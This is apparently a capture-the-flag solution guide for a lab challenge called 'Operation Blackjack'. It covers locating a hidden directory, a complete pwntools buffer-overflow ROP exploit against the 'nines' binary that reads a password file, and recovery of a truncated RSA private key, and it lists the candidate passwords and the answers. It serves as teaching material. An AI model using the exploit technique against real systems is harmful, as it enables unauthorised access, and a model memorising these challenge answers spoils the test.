# Operation Blackjack

_Solution Guide_

## Overview

There are three tasks for this challenge: find the secret casino, exploit one of the binaries in the casino games, and recover the RSA key from the casino manager to decrypt the communication files. This solution guide walks you through the solution, question by question.

## Question 1

_What is the location of the files running the secret casino? Please provide the full path to the directory hosting the casino._

There are clues on the space station (`space-station-gtwpi`) on how to find the casino. 

Using **ssh**, access the space station. Navigate to the `/home` directory which contains user directories and a suspicious text file.  

List the files using the command: `ls -la`. There is a secret folder named `.casino`. This is our target. `.casino` contains a few casino games, a file called `cash`, and a file called `welcome.txt`.

The answer to Question 1 is: `/home/.casino`

## Question 2

_What is the token found in the Casino Manager's home folder?_

**Remember:** You are provided the encrypted communications and the source code to one of the casino games we acquired. These files are available at `https://challenge.us/files`. It may take a few minutes for these files to become available.

1. On the `space-station-gtwpi` VM, in the `.casino` directory,  inspect each casino game. One of them is not like the others. Three are python programs (`dice`, `slots`, and `video_poker`); but `nines` is an executable binary. 

2. Run the command `checksec nines`. There is no stack canary and no PIE. The **Challenge Guide** tells you that you are given source code to one of the casino games acquired: i.e., the `nines` casino game. 

3. On the `crimebuster` VM, download the `nines.c` source code from `https://challenge.us/files` (You can put it on the `Desktop` if it makes things easier.)

4. Use Visual Studio Code (or your preferred text editor) to read `nines.c`.

There are a few lines that are important to notice in this file:
-  First, there is an interesting file path that is included in the code:
`const char* PASS = "/home/gyre/managerpass.txt";`
This would seem to be the location of the manager’s password.
- The next is a function called `get_file`, which takes in a pointer to a string, reads data from that file, prints it, then returns the value as an `int`. 
- The last line to note is the following: `fgets(play_again, 100, stdin);`
This takes in much larger input than the buffer of `play_again` allows, so we have an easy buffer overflow!

With this information, we can leverage the vulnerabilities in this code to develop an exploit to read the manager’s password (`/home/gyre/managerpass.txt`). 

Our next steps are: overflow the buffer to overwrite the RIP registry and redirect the execution to the `get_file` function with the location of the manager password file as a parameter. 

We suggest compiling the binary on the `crimebuster` VM for testing, then copying the exploit to `space-station-gtwpi`.

5. Compile the `nines` binary locally:

```bash
gcc -fno-stack-protector -no-pie -o nines nines.c
```

6. Create a `cash` file in your current directory and write a number inside it (we chose 1000). This represents your "cash" amount to bet in the game. This is required because not having it causes an error.  

```bash
nano cash
```

7. Create a file called `/home/gyre/managerpass.txt` on the `crimebuster` VM. You need **sudo** to do this, then use **chown** to change the file owner to your current user so that the local `nines` binary can read it.

``` bash
sudo useradd -m gyre 
sudo touch /home/gyre/managerpass.txt
sudo chown user:user /home/gyre/managerpass.txt
```
8. Once that's done, add whatever text you want to the text file you just created (we chose "testing123").

### Overwriting the RIP registry

Overwriting the RIP registry can be done in many ways. The easiest is trial and error. 

1. Still on the `crimebuster` VM, run `gdb nines`. Remember to create the `cash` file and the `/home/gyre/managerpass.txt` file first. 
2. Type `info registers` to get the current registers. 
3. Run the program using `run`. This allows you to play the game. 
4. At the first prompt ("Bet: "), enter **1**.
5. At the second prompt ("For Player: Slap (0) or Sit (1)?: "), enter **1** again.

   Recall that on the `nines.c` file, there was a vulnerable line that takes in much larger input than the buffer of `play_again` allows. On the third prompt ("Type yes to play again: "), it's asking you if you want to play again. 

6. Enter a large buffer like “**aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa**” to see how the program behaves. The program should segmentation fault, and gdb will tell you at what location. Here is an example of the output you might get:

   `Program received signal SIGSEGV, Segmentation fault.`

   `0x00007ffff7000a61 in ?? ()`

   You will want that Segmentation fault  message to show all your target letters instead of the location. Here's how. (To speed up this process you can use the `cyclic` tool on your terminal to generate a sequence of letters.) Through trial and error, if you perform  `cyclic 30`, you will get the following output: `aaaabaaacaaadaaaeaaafaaagabbbbb` (yours might be different).

7. Enter the obtained value into the third prompt. You will get an output similar to this one:

   `Program received signal SIGSEGV, Segmentation fault.`

   `0x00000a6262626262 in ?? ()`

   Those hex `62` are equivalent to character `b` of the string we entered before, which we can replace with any address we want to jump to.

### Building the ROP chain

From here, we can begin to develop our exploit. 

1. Create a python file called `exploit_nines.py`.

2. At the top of the file place the following code:

```python
from pwn import *
import os

directory_path = "/home/user/Desktop/"
context.clear(arch='amd64')
bin = 'nines'
elf = ELF(bin) 
pty = process.PTY  
```

This code says that we want to use **pwntools** and **os**, that our directory path is `/home/user/Desktop/` (if your `nines` binary is located in a different directory, make sure to change this line to reflect that). Use 	the absolute path; our target program is x64, and specifies what our target program is (`nines`). We also 	define **pty**, which helps with input and output. Next, we need to find the location of the manager password string in the binary. 

3. Include the following line in your python script to get the location/address of the manager's password string:

```python
str_addr = next(elf.search(b"/home/gyre/managerpass.txt"))
```

Now, we need to load that string into RDI register (which is passed as the first argument in x64), then call `get_file`. To do this, we need to find an ROP gadget in the binary, which is code that pops the stack into RDI, then returns to the address on the stack. Pwntools can build this for us.

4. Add the following line to your python script:

```python
rop = ROP(bin)  
rop.call("get_file", [str_addr])
```

To recap: what we need to do, is overflow the buffer to control the RIP registry, then point the RIP registry to our ROP chain -- which is code that will load the RDI registry with our password file string, then return to `get_file`. 

5. The next few lines do that: 

```python
buffer = b"aaaabaaacaaadaaaeaaafaaaga"
rip = rop.chain()
payload = buffer + rip
```

Notice that we removed all the `b` characters from our buffer. The payload's purpose is -- at the RIP registry at the end of our buffer -- to jump to the address of where our password file is. 

Then, we need to send this payload to the `nines` binary. Our end goal is to start the program, read until it prompts for a bet, send a 1, read until it prompts for a "slap" or "sit", send another 1, read until prompted to play *again*, deliver our payload. 

6. Add these lines to the python script: 

```python
proc = process(bin, stdin=pty, stdout=pty)
print(proc.sendlineafter(b"Bet: ", b"1")) 
print(proc.sendlineafter(b"?: ", b"1"))
print(proc.sendlineafter(b"again: ", payload))
```
We can just use the interactive feature to read the contents:

```python
proc.interactive()
```

If our local environment was set up correctly, we can see that the exploit reads the test password file! 

7. Now, **scp** the exploit to the `janitor` directory on `space-station-gtwpi`. 

```bash
scp exploit_nines.py janitor@space-station-gtwpi:~/
```

8. **ssh** into the `space-station-gtwpi` again with the provided credentials:

```bash
ssh janitor@space-station-gtwpi
```

9. Update the following line in our exploit code from

```python
directory_path = "/home/user/Desktop/"
```

to 

```python
directory_path = "/home/.casino/"
```

10. Beneath `directory_path` add the following line

```python
os.chdir(directory_path)
```

Here is the complete exploit: 

```python
from pwn import *
import os

directory_path = "/home/.casino/"
os.chdir(directory_path)

context.clear(arch='amd64')
bin = 'nines'
elf = ELF(bin)
pty = process.PTY
str_addr = next(elf.search(b"/home/gyre/managerpass.txt"))
rop = ROP(bin)
rop.call("get_file", [str_addr])
buffer = b"aaaabaaacaaadaaaeaaafaaaga"
rip = rop.chain()
payload = buffer + rip
proc = process(bin, stdin=pty, stdout=pty)
print(proc.sendlineafter(b"Bet:", b"1")) 
print(proc.sendlineafter(b"?: ", b"1"))
print(proc.sendlineafter(b"again: ", payload)) 
proc.interactive()
```

When you run this, you should see the manager's password. It will be one of the following: 
- iluvatlanticcity
- livinlasvegas
- jadoremanaco
- macaumoney
- biloxiblackjack

From here, you can change users to the `gyre` account by doing the following: 

11. To change your user from `janitor` to `gyre`:

 ```bash
 su gyre
 ```
12. When prompted for a password, enter the found password.

13. Navigate to Gyre's folder:

 ```bash
 cd /home/gyre
 ```

14. Read the first flag. It will be a random sequence of hex values. This is the answer to Question 2.

```bash
cat flag.txt
```

## Question 3

_After decrypting the communications, enter the password to the financial logs that the aliens provided._

After gaining access to Gyre's account, an RSA public and private key can be found in the home directory. Investigate the private key using the following command:

```bash
xxd id_rsa
```
The private key is missing a large number of bytes as seen in the screen shot below.

![Partial RSA Key](./img/partial-key.png)

The goal is to recover the full private key and use it to decrypt the communications file (`comms.zip`) you downloaded from `https://challenge.us/files`. One way to do this is to generate a dummy RSA private key of the same length and compare the two files. 

Create a dummy RSA private key to compare both files: 

```bash
openssl genrsa -out dummy_private-key.pem 1024
```

>_Make sure the files are the same length. If the RSA keys are not the same length, they might have a slightly different format making it more difficult to recover the key._ 

These private keys are in PEM format, which is base64 encoded DER with a header and footer. DER format follows the type-length-data format, meaning that each value in the file contains one byte for the type of data encoded, the length of the data, and the data itself. 

For instance, the sequence `02 41` can be decoded as the following:

- `02` is the data type, representing an integer.
- `41` is the length value. Since the most significant bit here is `0`, this is in "short form.". In short form, the remaining bytes represent the length of the value. In this case, 65 bytes. More information on how to read the length can be found [here](https://en.wikipedia.org/wiki/X.690#Length_octets).
- The following 65 bytes after this header represent the data object.

The RSAPrivateKey ASN.1 specification is as follows:

```
RSAPrivateKey ::= SEQUENCE {
   version           Version,
   modulus           INTEGER,  -- n
   publicExponent    INTEGER,  -- e
   privateExponent   INTEGER,  -- d
   prime1            INTEGER,  -- p
   prime2            INTEGER,  -- q
   exponent1         INTEGER,  -- d mod (p-1)
   exponent2         INTEGER,  -- d mod (q-1)
   coefficient       INTEGER,  -- (inverse of q) mod p
   otherPrimeInfos   OtherPrimeInfos OPTIONAL
}
```

Starting at the very beginning of the file, the `version` header and data object appear, followed by the `modulus` and so on. By comparing a dummy RSA key, making note of the header locations with respect to the file, you can find that the partial key provided is truncated right at the start (or 1-2 bytes before) the `prime2` data block.

![Annotated Dummy RSA Key](./img/annotated-dummy.png)

In the screen capture above, starting at the top and reading from left to right, the data block headers are highlighted. In order, they represent the following:
- the entire RSAPrivateKey object of type SEQUENCE
- the version, specified as an integer
- the modulus
- the public exponent
- the private exponent
- Prime p
- Prime q
- Exponent 1
- Exponent 2
- Coefficient

By carefully observing the partial key. We can see that there are four section headers remaining, indicating we have prime2, exponent1, exponent2, and the coefficient.

![Annotated Partial Key](./img/annotated-partial.png)

Since we have a full public key found in Gyre's home directory, we can use the information remaining in the private key plus the information in the public key to recover the full key.

> **Note:** Even if we weren't provided prime2, this could still be recovered. The exponents and coefficient objects are used to speed up processing with RSA but using some tricky math and a very small amount of brute forcing (less than 10 seconds worth), the entire key can be recovered. Take a look at this [blog post](https://blog.cryptohack.org/twitter-secrets) for additional information.

Since the modulus (`n`) is equal to `p*q`, we can simply divide `n` by `q` to recover `p`. Using `p`, `q`, and `e` (from the public key file), we can recover the full key. 

> **Note to Python users:** Python does some strange things when dividing large numbers. Even though Python supports arbitrarily large integers, it cannot properly divide large integers using standard division. In other words, `n/q` != `p`. To do this, use the integer division operator: `p = n//q`.

### Decrypting the communications

1. SSH into `space-station-gtwpi` as user `gyre`. Use **scp** to copy the public and private keys to the `crimebuster` VM.

```bash
scp id_rsa user@crimebuster:/home/user/Desktop
scp id_rsa.pub user@crimebuster:/home/user/Desktop
```

2. Contained in the **solution** directory is the script `solver.py` which is the full solver script for Question 3. Use Visual Studio Code (or your preferred text editor) to create the `solver.py` script on the Desktop of the `crimebuster` VM. 

3. Run the `solver.py` script to recover the private key. It will be named **exp_key.pem** on the Desktop. 

4. Use **openssl** and the recovered key to decrypt each communication block:

```bash
openssl pkeyutl -decrypt -inkey exp_key.pem -in block1.enc > block1.txt
openssl pkeyutl -decrypt -inkey exp_key.pem -in block2.enc > block2.txt
openssl pkeyutl -decrypt -inkey exp_key.pem -in block3.enc > block3.txt
openssl pkeyutl -decrypt -inkey exp_key.pem -in block4.enc > block4.txt
openssl pkeyutl -decrypt -inkey exp_key.pem -in block5.enc > block5.txt
```

5. The answer to question 3 is the flag (random sequence of hex values) that is found in **block4.txt**. 
